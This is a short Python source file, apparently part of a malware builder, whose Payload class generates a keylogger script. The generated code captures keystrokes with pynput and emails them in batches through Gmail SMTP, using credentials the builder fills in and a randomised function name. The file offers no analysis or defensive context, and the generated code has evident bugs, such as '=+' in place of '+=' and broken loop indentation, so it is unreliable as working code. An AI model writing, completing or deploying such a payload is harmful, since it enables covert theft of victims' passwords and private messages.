class Payload:
    def __init__(self, email,password,strs):
        self.email = email
        self.password = password
        self.strs = strs
    def create(self):
        return f"""
from smtplib import SMTP as sm\nfrom ssl import create_default_context as c
s = sm("smtp.gmail.com",587)\ns.starttls(context=c())\ns.login("{self.email}", "{self.password}")
from pynput import Listener, Key\n_ = ""\ndef {self.strs[0]}(k):
\t_ =+ str(k)\n\tif len(_) == 20 :\n\t\ts.sendmail("{self.email}", "{self.email}", _)
while True:\n\t\twith Listener(on_press={self.strs[0]}) as l:\n\t\t\tl.join()
"""